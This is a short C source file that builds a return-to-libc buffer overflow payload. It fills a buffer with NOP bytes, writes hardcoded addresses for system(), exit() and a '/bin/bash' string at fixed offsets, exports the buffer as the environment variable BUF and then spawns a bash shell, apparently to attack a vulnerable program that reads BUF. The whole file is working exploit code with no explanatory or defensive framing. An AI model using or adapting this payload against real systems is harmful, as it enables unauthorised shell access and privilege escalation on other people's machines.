#include<stdio.h>
#include<stdlib.h>
#include<string.h>


char systemAddr[] = "\x60\xe5\xea\xb7";
char exitAddr[] = "\x50\x3b\xea\xb7";
char bashAddr[] = "\x50\xfd\xff\xbf";



main()
{
        char buffer[104];

        memset(buffer, 0x90, 104);
        memcpy(buffer, "BUF=", 4);
        memcpy(buffer+88, systemAddr, 4);
        memcpy(buffer+92, exitAddr, 4);
        memcpy(buffer+96, bashAddr, 4);
        memcpy(buffer+100, "\x00\x00\x00\x00", 4);

        putenv(buffer);
        system("/bin/bash");

        return 1;
}


